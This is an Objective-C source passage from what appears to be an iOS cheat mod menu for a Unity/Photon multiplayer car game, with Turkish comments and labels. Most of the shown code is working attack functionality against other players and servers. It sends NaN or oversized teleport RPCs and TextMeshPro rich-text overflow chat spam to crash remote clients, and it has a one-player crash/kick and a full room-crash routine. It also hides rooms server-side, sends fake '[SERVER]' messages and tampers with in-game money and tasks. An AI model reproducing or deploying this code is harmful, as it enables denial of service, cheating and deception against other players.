    [ac addAction:[UIAlertAction actionWithTitle:@"🌐 HEPSİNİ GİZLE (tüm oda listesi)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        NSMutableArray *all = [names mutableCopy];
        FLog([NSString stringWithFormat:@"🌐 TOPLU MOD: %lu oda islenecek", (unsigned long)all.count]);
        [self serverHideChain:all index:0];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"▶️ SEÇTİKLERİMİ İŞLE (kuyruk)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (targets.count == 0) {
            UIAlertController *w = [UIAlertController alertControllerWithTitle:@"⚠️" message:@"Kuyruk bos! Once ➕ ile oda sec." preferredStyle:UIAlertControllerStyleAlert];
            [w addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:w]; return;
        }
        FLog([NSString stringWithFormat:@"▶️ MANUEL MOD: %lu secili oda islenecek", (unsigned long)targets.count]);
        [self serverHideChain:targets index:0];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) {
        ac.popoverPresentationController.sourceView = self.panel;
        ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
    }
    [self present:ac];
}

- (void)serverHideChain:(NSArray*)targets index:(NSInteger)idx {
    if (idx >= (NSInteger)targets.count) {
        FLog([NSString stringWithFormat:@"🌐 [SUNUCU HIDE] BITTI — %lu oda islendi", (unsigned long)targets.count]);
        // v114.4: Chain bittiginde HR_PhotonLobbyManagerDummy.roomListPanel'i aktif et
        // Boylece oyun garaja atmak yerine oda listesi ekranini gosterir
        @try {
            if (g_hrLobbyMgrDummyType && g_offRoomListPanel > 0 && g_mGoSetActive && g_mFindObjectsPlural && i_runtime_invoke) {
                void* a[1]; a[0] = g_hrLobbyMgrDummyType;
                void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
                if (ptrOk(arr)) {
                    int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                    if (cnt > 0 && cnt < 8) {
                        void** items = (void**)((uintptr_t)arr + 0x20);
                        void* dummy = items[0];
                        if (unityAlive(dummy)) {
                            void* panel = *(void**)((uintptr_t)dummy + g_offRoomListPanel);
                            if (ptrOk(panel)) {
                                bool activate = true;
                                void* args[1]; args[0] = &activate;
                                i_runtime_invoke(g_mGoSetActive, panel, args, NULL);
                                FLog(@"🌐 roomListPanel SetActive(true) - oda listesi ekrani goruntulendi");
                            }
                        }
                    }
                }
            } else FLog([NSString stringWithFormat:@"🌐 roomListPanel switch atlandi (type=%p off=%d setActive=%p)", g_hrLobbyMgrDummyType, g_offRoomListPanel, g_mGoSetActive]);
        } @catch (...) { FLog(@"🌐 roomListPanel switch exception"); }
        UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🌐 Bitti" message:[NSString stringWithFormat:@"%lu oda islendi.\nOda listesine yönlendirildin.", (unsigned long)targets.count] preferredStyle:UIAlertControllerStyleAlert];
        [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:r];
        return;
    }
    NSString *nm = targets[idx];
    FLog([NSString stringWithFormat:@"🌐 [%ld/%lu] '%@' odasina giriyor...", (long)(idx+1), (unsigned long)targets.count, nm]);

    // 1) Mevcut odadan CIK — 2s bekle (Photon leave onayi icin)
    if (pn_getInRoom && pn_getInRoom() && pn_leaveRoom) {
        @try { pn_leaveRoom(false); FLog(@"  ⇐ Mevcut odadan cikildi"); } @catch (...) {}
    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{

        // 2) Hedef odaya GIR
        void* ns = mkStr(nm);
        bool joined = false;
        if (pn_joinRoom && ns) {
            @try { joined = pn_joinRoom(ns, NULL); } @catch (...) {}
            FLog([NSString stringWithFormat:@"  ⇒ JoinRoom('%@') -> %s", nm, joined?"OK":"FAIL"]);
        }
        if (!joined && pn_joinOrCreateRoom && ns) {
            @try { joined = pn_joinOrCreateRoom(ns, NULL, NULL, NULL); } @catch (...) {}
            FLog([NSString stringWithFormat:@"  ⇒ JoinOrCreateRoom fallback -> %s", joined?"OK":"FAIL"]);
        }
        if (!joined) {
            FLog(@"  ✗ Odaya girilemedi (kilitli/sifreli/dolu) — atlaniyor");
            [self serverHideChain:targets index:idx+1];
            return;
        }

        // 3) Odaya girme SUNUCU onayi icin 3s bekle
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                // Master ol
                few1n_claimMaster();
                FLog(@"  🔑 Master claim gonderildi");

                // 4) Master onayi icin 2s bekle, DOGRULAMA yap
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    bool amMaster = false;
                    @try {
                        if (pn_getLocalPlayer && ply_getIsMaster) {
                            void* me = pn_getLocalPlayer();
                            if (me) amMaster = ply_getIsMaster(me);
                        }
                    } @catch (...) {}

                    if (!amMaster) {
                        FLog([NSString stringWithFormat:@"  ⚠️ Master OLAMADIM (odada baska master var), IsVisible sunucu reddedebilir"]);
                    } else {
                        FLog(@"  👑 MASTER onayli — gizleme deneniyor");
                    }

                    void* room = pn_getCurrentRoom ? pn_getCurrentRoom() : NULL;
                    if (ptrOk(room) && room_setIsVisible) {
                        @try {
                            room_setIsVisible(room, false);
                            FLog([NSString stringWithFormat:@"  🙈 '%@' → IsVisible=false gonderildi %@", nm, amMaster?@"(BASARILI olmasi lazim)":@"(master degilim, reddedilebilir)"]);
                        } @catch (...) { FLog(@"  ✗ IsVisible exception"); }
                    } else {
                        FLog(@"  ✗ room NULL veya room_setIsVisible NULL");
                    }

                    // 5) Cik + 1s bekle + sonraki oda
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        if (pn_leaveRoom) { @try { pn_leaveRoom(false); FLog(@"  ⇐ Odadan cikildi, sonrakine geciliyor"); } @catch (...) {} }
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            [self serverHideChain:targets index:idx+1];
                        });
                    });
                });
            } @catch (...) { [self serverHideChain:targets index:idx+1]; }
        });
    });
}

- (void)joinRoomByName {
    if (!pn_joinRoom) { FLog(@"JoinRoom hazir degil (lobiye gir)"); return; }

    // v96: Hook doldurmasi guvenilmez. showRoomPasswords'un CANLI RoomLine scan metodunu
    // kullan - il2cpp FindObjectsOfType<RoomLine>() sahnedeki oda kartlarindan direkt oku.
    NSMutableArray *liveNames = [NSMutableArray array];
    if (g_roomLineType && g_mFindObjectsPlural && i_runtime_invoke) {
        @try {
            void* a[1]; a[0] = g_roomLineType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (cnt > 0 && cnt < 256) {
                    void** lines = (void**)((uintptr_t)arr + 0x20);
                    for (int i = 0; i < cnt; i++) {
                        void* ln = lines[i]; if (!unityAlive(ln)) continue;
                        void* rinfo = *(void**)((uintptr_t)ln + 0x58);
                        if (ptrOk(rinfo) && rinfo_getName) {
                            NSString *nm = readStr(rinfo_getName(rinfo));
                            if (nm.length > 0 && ![liveNames containsObject:nm]) [liveNames addObject:nm];
                        }
                    }
                }
            }
        } @catch (...) {}
    }
    // fallback: hook cache'i de dene
    if (g_lobbyRoomNames) {
        @synchronized(g_lobbyRoomNames) {
            for (NSString *nm in g_lobbyRoomNames) if (nm.length > 0 && ![liveNames containsObject:nm]) [liveNames addObject:nm];
        }
    }

    NSString *subTitle = (liveNames.count > 0)
        ? [NSString stringWithFormat:@"Lobide %lu aktif oda bulundu.\nKatılmak istediğin odaya dokun\n(Dolu 10/10 odalar dahil!):", (unsigned long)liveNames.count]
        : @"⚠️ Lobide oda gorunmuyor.\n\n1) Once LOBI ekranini ac (oda listesi gorunecek)\n2) 2-3 saniye kaydir (asagi/yukari)\n3) Butonu YENIDEN bas";

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🚪 Canlı Odalara Gir (Dolu Oda Bypass)"
                                                               message:subTitle preferredStyle:UIAlertControllerStyleAlert];

    for (NSString *roomNm in liveNames) {
        NSString *cleanName = stripRichTextTags(roomNm);
        if (cleanName.length == 0) cleanName = roomNm;
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"🚪 🟢 %@", cleanName]
            style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            few1n_joinTargetRoom(roomNm);
        }]];
    }

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)fakeServerMsg {
    if (!chatGetInst || !chatSend) { FLog(@"Chat pointeri yok - odaya gir"); return; }
    NSArray *presets = @[
        @"[SERVER] Bakim 5 dakika sonra basliyor",
        @"[SERVER] Etkinlik basladi! 2x odul",
        @"[SERVER] Hile tespiti aktif 👀",
        @"[SERVER] Yeni guncelleme yayinlandi",
        @"[DUYURU] FEW1N odaya katildi"
    ];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"📡 Sahte SERVER Mesaji"
        message:@"Sec veya kendin yaz. Not: yaninda kendi ismin de gorunur - Gorunmez isim ile birlestir." preferredStyle:UIAlertControllerStyleAlert];
    for (NSString *p in presets) {
        [ac addAction:[UIAlertAction actionWithTitle:p style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            @try { void* mgr = chatGetInst(); void* s = mkStr(p); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
            FLog(@"Sahte server mesaji gonderildi");
        }]];
    }
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"[SERVER] kendi mesajin"; tf.text = @"[SERVER] "; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kendi Mesajimi Gonder" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length > 0) { @try { void* mgr = chatGetInst(); void* s = mkStr(t); if (mgr && s) chatSend(mgr, s); } @catch (...) {} FLog(@"Ozel server mesaji gonderildi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)editMoneyAmount {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4B5 Para Miktari" message:@"Eklenecek miktar:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeNumberPad; tf.text = [NSString stringWithFormat:@"%d", customMoneyAmount]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        long long v = [ac.textFields.firstObject.text longLongValue];
        if (v > 0) { if (v > 2000000000LL) v = 2000000000LL; customMoneyAmount = (int)v; saveInt(@"moneyAmount", customMoneyAmount); [self refreshUI]; }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// v114.11: DailyTaskManager.activeTasks listesindeki her DailyTask'in progress'ini
// target'a esitler + isCompleted = true. Kullanici oyunda "Claim" butonuna basip
// odul alir. Obfuscated method isimleri (gbs, gbc, gbd) yerine il2cpp field API
// ile direkt yaziyoruz - drift immune. List<T> layout: _items @0x10 (T[]), _size @0x18.
- (void)completeAllDailyTasks {
    NSString *(^err)(NSString*) = ^NSString*(NSString *reason){
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🎯 Daily Tasks" message:reason preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e];
        return nil;
    };
    if (!i_class_from_name || !i_class_get_field_from_name || !i_field_get_offset || !i_runtime_invoke) { err(@"il2cpp API hazir degil"); return; }

    void *dtmCls = few1n_classAnyImage("", "DailyTaskManager");
    if (!dtmCls) { err(@"DailyTaskManager class bulunamadi (oyun eski surumde mi?)"); return; }
    void *dtCls  = few1n_classAnyImage("", "DailyTask");
    if (!dtCls)  { err(@"DailyTask class bulunamadi"); return; }

    void *fActive    = i_class_get_field_from_name(dtmCls, "activeTasks");
    void *fProgress  = i_class_get_field_from_name(dtCls,  "currentProgress");
    void *fTarget    = i_class_get_field_from_name(dtCls,  "targetValue");
    void *fCompleted = i_class_get_field_from_name(dtCls,  "isCompleted");
    if (!fActive || !fProgress || !fTarget || !fCompleted) { err(@"DailyTask field'lari bulunamadi (obfuscation degismis olabilir)"); return; }
    int offActive    = (int)i_field_get_offset(fActive);
    int offProgress  = (int)i_field_get_offset(fProgress);
    int offTarget    = (int)i_field_get_offset(fTarget);
    int offCompleted = (int)i_field_get_offset(fCompleted);

    void *typeObj = few1n_typeObjOf(dtmCls);
    if (!typeObj) { err(@"DailyTaskManager typeObj alinamadi"); return; }
    void *mgr = few1n_findByType(typeObj);
    if (!ptrOk(mgr)) { err(@"Sahnede DailyTaskManager instance yok (once daily task menusune gir)"); return; }

    void *list = *(void**)((uintptr_t)mgr + offActive);
    if (!ptrOk(list)) { err(@"activeTasks null - once daily task menusunu ac"); return; }

    // List<T> layout (mscorlib): _items T[] @0x10, _size int @0x18
    void *items = *(void**)((uintptr_t)list + 0x10);
    int size = *(int*)((uintptr_t)list + 0x18);
    if (!ptrOk(items) || size <= 0 || size > 100) { err([NSString stringWithFormat:@"Liste bos veya anormal boyut (%d)", size]); return; }

    int done = 0;
    for (int i = 0; i < size; i++) {
        void *task = *(void**)((uintptr_t)items + 0x20 + i * 8);
        if (!ptrOk(task)) continue;
        @try {
            int target = *(int*)((uintptr_t)task + offTarget);
            *(float*)((uintptr_t)task + offProgress) = (float)target;
            *(unsigned char*)((uintptr_t)task + offCompleted) = 1;
            done++;
        } @catch (...) {}
    }

    FLog([NSString stringWithFormat:@"🎯 Daily Tasks: %d/%d tamamlandi (progress=%d, target=%d, completed=1)", done, size, offProgress, offTarget]);
    UIAlertController *ok = [UIAlertController alertControllerWithTitle:@"🎯 Daily Tasks"
        message:[NSString stringWithFormat:@"✅ %d/%d task tamamlandi.\n\nOyun icindeki Daily Task menusunu ac, her tamamlanmis task'in yaninda 'Claim' butonuna bas, paran gelsin.", done, size]
        preferredStyle:UIAlertControllerStyleAlert];
    [ok addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
    [self present:ok];
}

- (void)editPlate {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F522 Ozel Plaka" message:@"Plakada gorunecek yazi:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"FEW1N"; if (isCustomPlateEnabled) tf.text = [NSString stringWithUTF8String:customPlateText]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length > 0) { strncpy(customPlateText, t.UTF8String, sizeof(customPlateText)-1); customPlateText[sizeof(customPlateText)-1]='\0'; isCustomPlateEnabled = true; saveStr(@"plateText", t); saveBool(@"plateEnabled", true); [self refreshUI]; }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:^(UIAlertAction *a){ isCustomPlateEnabled = false; saveBool(@"plateEnabled", false); [self refreshUI]; }]];
    [self present:ac];
}

// ===== REKLAM BOZUCU TOGGLE (CANLI / ANINDA) =====
- (void)tapAdBlock {
    isAdBlockEnabled = !isAdBlockEnabled;
    saveBool(@"adblock", isAdBlockEnabled);
    FLog(isAdBlockEnabled ? @"\U0001F6AB Reklam bozucu ACIK - il2cpp + native aninda aktif!" : @"\U0001F6AB Reklam bozucu KAPALI");
    [self refreshUI];
}

// ===== NAN / CRASH PAKET INJECT =====
- (void)tapNanCrash {
    isNanCrashEnabled = !isNanCrashEnabled;
    saveBool(@"nancrash", isNanCrashEnabled);
    FLog(isNanCrashEnabled ? @"NAN Crash ACIK - Rigidbody'ye NaN inject ediliyor" : @"NAN Crash KAPALI");
    [self refreshUI];
}
- (void)fireNanCrashLocal {
    if (!unityAlive(g_rb) || !g_carPhotonSyncTypeObj || !g_mGetCompInParent || !i_runtime_invoke || !cps_TeleportCar_RPC) {
        FLog(@"NAN: araba veya CPS hazir degil"); return;
    }
    @try {
        // Pozisyonu kaydet
        Vec3 savedPos = {0,0,0};
        Vec3 savedVel = {0,0,0};
        rbGetPosIl(g_rb, &savedPos);
        rbGetVelIl(g_rb, &savedVel);
        // Kendi CPS'inden NaN RPC gonder (ag uzerinden diger clientlara gider)
        void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
        void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
        if (ptrOk(cps)) {
            Vec3 nan = {nanf(""), nanf(""), nanf("")};
            Quaternion nanQ = {nanf(""), nanf(""), nanf(""), nanf("")};
            cps_TeleportCar_RPC(cps, nan, nanQ, NULL);
            FLog(@"NAN RPC kendi CPS'inden gonderildi - uzak clientlar cokmeli");
        }
        // HEMEN pozisyonu geri yukle
        rbSetPosIl(g_rb, &savedPos);
        rbSetVelIl(g_rb, &savedVel);
        Vec3 zero = {0,0,0};
        rbSetAngVelIl(g_rb, &zero);
    } @catch (...) { FLog(@"NAN yerel hatasi"); }
}
// ===== TEK OYUNCUYU SEC & COKERT / AT =====
- (void)targetPlayerCrash {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odada Değilsin"
            message:@"Bir oyuncuyu çökertmek/atmak için önce bir odaya katılmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }
    @try {
        NSMutableArray *rows = [NSMutableArray array];

        // 1) PlayerListOthers üzerinden oyuncuları oku
        if (pn_getPlayerListOthers) {
            void* arr = pn_getPlayerListOthers();
            if (ptrOk(arr)) {
                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                void** ps = (void**)((uintptr_t)arr + 0x20);
                for (int i = 0; i < c && i < 64; i++) {
                    void* p = ps[i]; if (!ptrOk(p)) continue;
                    void* nsObj = ply_getNickName ? ply_getNickName(p) : NULL;
                    NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
                    int actor = ply_getActorNumber ? ply_getActorNumber(p) : 0;
                    bool isMaster = ply_getIsMaster ? ply_getIsMaster(p) : false;
                    NSString *label = nm.length > 0 ? nm : [NSString stringWithFormat:@"Oyuncu#%d", actor];
                    [rows addObject:@{
                        @"nick": label,
                        @"actor": @(actor),
                        @"master": @(isMaster),
                        @"playerObj": [NSValue valueWithPointer:p]
                    }];
                }
            }
        }

        // 2) Fallback: PlayerList (Others boş dönerse tüm listeyi dene, kendini çıkar)
        if (rows.count == 0 && pn_getPlayerList) {
            void* arr = pn_getPlayerList();
            if (ptrOk(arr)) {
                int myActor = -1;
                if (pn_getLocalPlayer && ply_getActorNumber) {
                    void* me = pn_getLocalPlayer();
                    if (ptrOk(me)) myActor = ply_getActorNumber(me);
                }
                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                void** ps = (void**)((uintptr_t)arr + 0x20);
                for (int i = 0; i < c && i < 64; i++) {
                    void* p = ps[i]; if (!ptrOk(p)) continue;
                    int actor = ply_getActorNumber ? ply_getActorNumber(p) : 0;
                    if (actor == myActor) continue;  // kendini atla
                    void* nsObj = ply_getNickName ? ply_getNickName(p) : NULL;
                    NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
                    bool isMaster = ply_getIsMaster ? ply_getIsMaster(p) : false;
                    NSString *label = nm.length > 0 ? nm : [NSString stringWithFormat:@"Oyuncu#%d", actor];
                    [rows addObject:@{
                        @"nick": label,
                        @"actor": @(actor),
                        @"master": @(isMaster),
                        @"playerObj": [NSValue valueWithPointer:p]
                    }];
                }
            }
        }

        if (rows.count == 0) {
            FLog(@"Odada başka oyuncu bulunamadı (PlayerListOthers + PlayerList ikisi de boş)");
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Tek Oyuncu Seç & Çökert"
                message:@"Odada senden başka oyuncu bulunamadı.\n\nNot: Oyuncu listesi henüz yüklenmemiş olabilir, birkaç saniye bekleyip tekrar dene." preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:ac];
            return;
        }

        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Tek Oyuncu Seç & Çökert"
            message:[NSString stringWithFormat:@"Odada %d oyuncu bulundu.\nÇökertmek / atmak istediğine dokun:", (int)rows.count]
            preferredStyle:UIAlertControllerStyleAlert];

        for (NSDictionary *r in rows) {
            NSString *nm = r[@"nick"];
            int actor = [r[@"actor"] intValue];
            bool isMaster = [r[@"master"] boolValue];
            void* pObj = [r[@"playerObj"] pointerValue];
            NSString *tag = isMaster ? @"👑" : @"💥";
            NSString *title = [NSString stringWithFormat:@"🎯 %@ %@ (#%d)", tag, nm, actor];
            [ac addAction:[UIAlertAction actionWithTitle:title
                style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
                // Dispatch ile UI bloklama engelle
                dispatch_async(dispatch_get_main_queue(), ^{
                    @try {
                        FLog([NSString stringWithFormat:@"🎯 Hedef seçildi: '%@' (Actor=%d)", nm, actor]);
                        few1n_kickPlayer(pObj);
                    } @catch (...) { FLog(@"🎯 Kick/crash exception"); }
                });
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ac];
    } @catch (...) { FLog(@"Tek oyuncu çökertme hatası"); }
}

- (void)tapNanCrashRemote {
    [self fireNanCrashRemote];
}

- (void)fireNanCrashRemote {
    if (!pn_getInRoom || !pn_getInRoom()) {
        FLog(@"NAN Remote: Odada değilsin"); return;
    }
    @try {
        Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
        Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
        // 1) Kendi pozisyonunu kaydet
        Vec3 savedPos = {0,0,0};
        Vec3 savedVel = {0,0,0};
        if (unityAlive(g_rb)) {
            rbGetPosIl(g_rb, &savedPos);
            rbGetVelIl(g_rb, &savedVel);
        }
        // 2) Kendi CPS'inden Exploit RPC gönder
        if (unityAlive(g_rb) && g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
            void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
            void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
            if (ptrOk(cps)) {
                cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
            }
        }
        // 3) Chat TMPro Overflow Gönder (Garanti Tüm Client'ları Çökertir)
        if (chatGetInst && chatSend) {
            NSString *nuke = @"<size=9999%><line-height=9999%><font=\"Arial\"><b>💥 FEW1N NUKE 💥</b></font></size>";
            void* mgr = chatGetInst();
            void* s = mkStr(nuke);
            if (mgr && s) chatSend(mgr, s);
        }
        // 4) HEMEN pozisyonu geri yükle
        if (unityAlive(g_rb)) {
            rbSetPosIl(g_rb, &savedPos);
            rbSetVelIl(g_rb, &savedVel);
            Vec3 zero = {0,0,0};
            rbSetAngVelIl(g_rb, &zero);
        }
        FLog(@"💀 Exploit NAN Crash paketi başarıyla gönderildi!");
    } @catch (...) { FLog(@"NAN remote hatası"); }
}

- (void)tapRoomCrash {
    [self fireRoomCrash];
    few1n_after(0.5, ^{ if (pn_leaveRoom) pn_leaveRoom(false); });
}

- (void)fireRoomCrash {
    @try {
        FLog(@"☠️ ODA ÇÖKERTME BAŞLADI ☠️");
        // 1) Otomatik Master Client yetkisini zorla
        if (pn_getLocalPlayer && pn_setMasterClient) {
            void* me = pn_getLocalPlayer();
            if (me) pn_setMasterClient(me);
        }

        // 2) Tüm oyuncuları at (Master + Lobby RPC + Target RPC)
        [self nativeKickAll];

        // 3) Chat TextMeshPro Overflow payload (Tüm istemcilerin TMPro'sunu kilitler/çökertir)
        if (chatGetInst && chatSend) {
            for (int k=0; k<3; k++) {
                NSString *nuke = @"<size=99999%><line-height=99999%><font=\"Arial\"><b>💥 FEW1N NUKE CRASH 💥</b></font></size>";
                void* mgr = chatGetInst();
                void* s = mkStr(nuke);
                if (mgr && s) chatSend(mgr, s);
            }
        }

        // 4) Sahnedeki TÜM PhotonView nesnelerine Teleport RPC Düşürme paketi
        if (g_photonViewType && g_mFindObjectsPlural && i_runtime_invoke) {
            void* b[1]; b[0] = g_photonViewType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b, NULL);
            if (ptrOk(arr)) {
                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                void** pvs = (void**)((uintptr_t)arr + 0x20);
                for (int i = 0; i < c && i < 128; i++) {
                    void* pv = pvs[i]; if (!unityAlive(pv)) continue;
                    Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
                    Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
                    if (g_carPhotonSyncTypeObj && g_mGetCompInParent && cps_TeleportCar_RPC) {
                        void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
                        void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
                        if (ptrOk(cps)) {
                            cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
                        }
                    }
                }
            }
        }

        // 5) Photon Event 202 Invalid Byte RaiseEvent (Sunucu tarafı bağlantısını keser)
        if (pn_raiseEvent) {
            unsigned char evCode = 202;
            pn_raiseEvent(evCode, NULL, true, NULL);
        }

        FLog(@"☠️ ODA ÇÖKERTME PAKETLERİ TAMAMLANDI ☠️");
    } @catch (...) { FLog(@"Oda çökertme hatası"); }
}

- (void)tapInstantCrash {
    panicCrash = true;
    FLog(@"🔴 PANIC AKTİF - Anında çökertme başlıyor");
    [self refreshUI];
}

- (void)tapSurrogateSpam {
    if (!chatGetInst || !chatSend) {
        FLog(@"Chat hazır değil - önce odaya gir!");
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odaya Katıl"
            message:@"TMPro exploit spam'i için lütfen önce bir odaya katılın." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }
    @try {
        for (int k=0; k<5; k++) {
            NSMutableString *crash = [NSMutableString string];
            for (int j=0; j<40; j++) [crash appendString:@"<size=9999%><line-height=9999%><color=#FF0000><b>FEW1N</b></color></size>"];
            void* mgr = chatGetInst();
            void* s = mkStr(crash);
            if (mgr && s) chatSend(mgr, s);
        }
        FLog(@"TMPro UI overflow spam gönderildi");
    } @catch (...) {}
}

- (void)tapMaxPlayerOverflow {
    if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) {
        FLog(@"Oda kurma hazır değil"); return;
    }
    @try {
        __block Vec3 savedPos = {0,0,0};
        if (unityAlive(g_rb)) rbGetPosIl(g_rb, &savedPos);
        void* ns = mkStr(@"OVERFLOW");
        void* opts = i_object_new(g_roomOptionsClass);
        if (ns && opts) {
            *(bool*)((uintptr_t)opts + 0x10) = true;
            *(bool*)((uintptr_t)opts + 0x11) = true;
            *(int*)((uintptr_t)opts + 0x14) = 0x7FFFFFFF;
            *(int*)((uintptr_t)opts + 0x1C) = 0x7FFFFFFF;
            pn_createRoom(ns, opts, NULL, NULL);
            FLog(@"MaxPlayer=INT_MAX overflow denendi");
        }
        few1n_after(0.2, ^{ if (unityAlive(g_rb)) rbSetPosIl(g_rb, &savedPos); });
    } @catch (...) { FLog(@"Overflow hatası"); }
}

// ===== MODU YENIDEN BASLAT (oyunu kapatmadan il2cpp cozumunu tekrar calistir) =====
// Araba ilk aciliste bulunamadiysa (sahne gec yuklendiyse) bu buton her seyi yeniden arar.
- (void)restartMod {
    FLog(@"=== MOD YENIDEN BASLATILIYOR ===");
    // araba onbellegini temizle
    g_carDrive = NULL; g_carNitro = NULL; g_rb = NULL; g_origTop = 0.0f; g_classScanned = 0;
    // il2cpp cozumunu tekrar calistir - araba assembly'si sonradan yuklendiyse simdi bulunur
    few1n_initIl2cpp();
    few1n_findCar();
    NSString *sonuc = [NSString stringWithFormat:@"Yeniden baslatildi: carTip=%@ araba=%@ rb=%@",
                       g_carDriveTypeObj?@"VAR":@"YOK", g_carDrive?@"VAR":@"YOK", g_rb?@"VAR":@"YOK"];
    FLog(sonuc);
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F504 Mod Yeniden Baslatildi"
                                                               message:sonuc preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
    [self present:ac];
    [self refreshUI];
}

- (void)showLog {
